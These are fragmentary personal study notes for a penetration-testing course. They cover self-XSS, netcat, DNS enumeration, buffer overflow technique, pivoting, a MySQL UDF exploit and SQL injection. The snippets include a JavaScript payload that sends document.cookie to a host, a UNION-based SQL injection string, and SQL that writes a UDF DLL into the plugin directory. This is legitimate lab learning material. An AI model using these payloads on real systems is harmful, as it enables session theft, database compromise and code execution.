...
** self-xss
   + ref:
     - PWK p305
     - [[https://en.wikipedia.org/wiki/Secure_cookie][wiki, Secure cookie]]
     - [[https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Secure_and_HttpOnly_cookies][MDN, Secure and HttpOnly cookie]]
     - [[https://stackoverflow.com/questions/15198231/why-cookies-and-set-cookie-headers-cant-be-set-while-making-xmlhttprequest-usin][XmlHttpRequest does not support cookie]]
   ...
   + src (secure attribute):
   #+begin_src http
   Set-Cookie: id=a3fWa; Expires=Thu, 21 Oct 2021 07:28:00 GMT; Secure; HttpOnly
     # Secure: only over https;
     # HttpOnly: not accessible by JavaScript (document.cookie)
   #+end_src

   + src:
   #+begin_src javascript
   new Image().src=`http://127.0.0.1/${document.cookie}`
   #+end_src
...
*** sed
    + perform text editing on a *stream* of text. e.g. `echo "ab cd" | sed 's/cd/ef'`, the dst after sed is still STDOUT.
...
*** netcat //has several versions: nmap-ncat, nc
    ...
    OPTIONAL TCP handshaking and attack vector.(SYN -> SYN/ACK -> ACK)

**** stealth scan (gsec stealth port scanning methods 1985)
    OPTIONAL how nc stealth scan work. (wireshark) (it is definitely not stealth: it break nc listening process.)
    + Inverse Mapping
...
*** system call tracing, libcall tracing // man syscall
    + ~strace~
...
**** $_ //delay bind operator, or "this" in foreach
     + ~10..1~
...
*** tcpdump OPTIONAL advanced if necessary
...
*** example2
    //p132 process string of searchsploit result, and auto download raw from original site.
...
*** OPTINAL Maltego (OSINT data mining tool)
...
** DNS enumeration OPTIONAL recursor
...
**** reverse lookup brute force (ip -> hostname, check PTR, p179)
     #+begin_quote
...
**** DNSRecon (.py script) try zone transfer
    + usage:
      #+begin_src sh
...
* Book3_Chapter 10, 11, 12 Buffer Overflow
** basic
   + ref: [[https://security.stackexchange.com/questions/157478/why-jmp-esp-instead-of-directly-jumping-into-the-stack][]]
...
*** the *function prologue*
    + ref:
      ...
      - [[https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-instruction-set-reference-manual-325383.pdf][Intel x86 instruction set reference manual]]
...
** DEP, ASLR, and CFG
   + Data Execution Prevention(DEP): Specify executable section. raise an exception when code from data pages executed. (OPTIONAL keyword: NXCompat)
   + Address Space Layout Randomization(ASLR): randomize the base address of loaded applications and DLLs on system reboot.
   + Control Flow Guard(CFG): ?
   + [[https://docs.microsoft.com/en-us/cpp/build/reference/safeseh-image-has-safe-exception-handlers?view=vs-2019][Safe SEH]]
...
** Identifying bad characters
   ...
   + info:
     - It depends on the *application, vulnerability type, and protocols in use*. e.g. `\x0D` is End Of field in a HTTP POST req.
     - To identify, throw a list of 256 chars b"\x00" to b"\xFF" to the buffer. A bad char would End the input, and the rest would not present in the memory.

** Linux Buffer Overflow
   + details in `assets/protostar/README-protostar.md`

** Windows Buffer Overflow, SyncBreeze (return to a static library)
  + first, control EIP.
  + then, `info proc mappings` equivalent, `mona.py` [https://github.com/corelan/mona]. 
  + use `!mona modules` to find a library whose Rebase, SafeSEH, ASLR, DEP flags are false. (which means the stack would be static)
  + in addition, the address of the lib should contains no bad chars (leading digits of the address, 0x00XXXXXX)
  + find a `JMP ESP` gadget. If the DEP is enabled, the instruction should also be in `.text` section.
  + Because before the `ret`, the $esp should be directly pointing at the payload see the function prologue.
  + in a `__stdcall`, `ret <imm16>` maybe used instead of `ret`. Since the callee would do the clean-up. In that case, the <imm16> bytes of extra padding is necessary.

*** find the `JMP ESP` in multi memory space
...
** python3 auto char encoding

   + problem: python3 would auto encode some bytes.

   #+begin_src python
   python -c 'print("\x48\x49\x90\x84\xe3\xe9")' |xxd
     # 0000000: 4849 9084 e3e9 0a                        HI.....
   python3 -c 'print("\x48\x49\x90\x84\xe3\xe9")' |xxd
     # 0000000: 4849 c290 c284 c3a3 c3a9 0a              HI.........
   #+end_src

   + solution: write the raw bytes to a file, or send directly use a socket.

   #+begin_src python
import os, sys
s = (b"\x48\x49\x90\x84\xe3\xe9"
     b"\x48\x49\x90\x84\xe3\xe9")

with open("out.txt","wb") as F:
    F.write(s)
    F.close()
# xxd out.txt -> 00000000: 4849 9084 e3e9 4849 9084 e3e9            HI....HI....
   #+end_src
...
sudo proxychains rdesktop 192.168.1.110
  # e.g. to obtain GUI access to the DC through the pivot.
    #+end_src
      ...
      - =portfwd= port forwarding (remote), with meterpreter.
    #+begin_src meterpreter
...
**** (optional) python interactive shell
     + ref:
...
**** enum opened port (bash: /dev/tcp/host/port) (portscan.sh)
     + info:
...
*** Application/Service Enumeration (mysql udf exploit)
...
select hex(load_file('/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll')) into dumpfile '/tmp/udf.hex';
        /* (ref p7) */
        #+end_src
      - or write binary to a table (or select $binary into dumpfile "$plugin_dir"?)
      #+begin_src sql
...
select data from temp into dumpfile "D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21- winx64\\lib\\plugin\\udf.dll";
      #+end_src
...
*** basic commands
    ...
    + bt(backtrace) full                 # backtrace, use after crash
...
*** SETUID AND SETGID BITS (sticky bit)
    + info:
      - man 1 chmod
    + summary
      - `chmod u+s`
      - `chmod g-s`, `chmod 00755`, `chmod =755`
      - the `x` takes extra state when `s` set, run as owner or owner's group
      - the behavior differ depends on the underlying `chmod` syscall 
...
** TODO ref, resources
   - [[https://github.com/AdmiralGaust/SQL-Injection-cheat-sheet][SQL Pre Injection Enum]]
   - [[https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet][Master list]]
   - [[https://portswigger.net/web-security/sql-injection/cheat-sheet][General list]]
     + String concatenation
   - [[https://portswigger.net/web-security/sql-injection/union-attacks][Union attacks]]
     + Union attacks
   - [[https://owasp.org/www-project-juice-shop/][OWARSP Juice Shop]]
...
*** PWK cp24, wordpress webserver (linux) -> sql server (linux)
    ...
    - follow the exploit, Burp and SQL Injection (PWK p755) `OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,table_name,11 FROM information_schema.tables#"]`
...
*** PWK cp10, Windows Buffer Overflow (SyncBreeze) p370
    - fuzzing, with a poc script, `import time; while (size < 2000) {fuzz(); size+=100; time.sleep(10); }`
    - pid and tcp port, tool: https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview
    - attach debugger with ADMIN privilege
    - the overflow crash the service
TODO Q: need EIP value on crash? p381
...
** TODO list
  + (Burp setup, test in box)
  + *Exploiting Admin Consoles, XSS, LFI && (RFI), DirTraversal, test in box*
  (p275-321)
  7th lfi, 8-9th sql
  beef? allow/not

  p306 - self xss -> src -> nc
  9.4.4.3 log + LFI

  TODO report env, pandoc

TODO identify bad chars, ref: [[https://github.com/gh0x0st/Buffer_Overflow][Buffer Overflow guide]]
TODO pattern_create.rb
  - pattern_create.rb -l 600 identify eip
  - pattern_offset.rb -q ...

  + *SQL (cp9.4 revisit p321)*
  + *sqlmap, test in box*
...
* extra 02 System Architecture reference 

+ img:

[[./img/e2_LinuxFileSystemArchitecture.png]]
[[./img/e2_WindowsArchitecture.png]]

* extra 03 route

** Routing table

  - Q: Does the order of `ip route` matters?
  - A: No. The specific one wins over generic ones. i.e. `10.1.2.151/32 <gw>` wins against `10.1.2.96/27 <gw>`.

  - Q: Does conflict happens when the length of Netmasks are the same?
  - A: No. Because route only happen on exact match. e.g. `10.0.0.0/8 <gw>` has no effect if ip is in the scope of `192.0.0.0/8`.

** Netmask calculation

  - Q: Given `ip 172.26.114.229`, `brd 172.26.127.255`, what is the possible Network mask length in bit?
  - A: Since ip 114 -> 0b01110010, brd 127 -> 0b01111111, in the 3rd section the mask could be 1b10000000 , 0b11000000, 0b11100000 or 0b11110000. 
  -    The possible length are 17, 18, 19, 20.
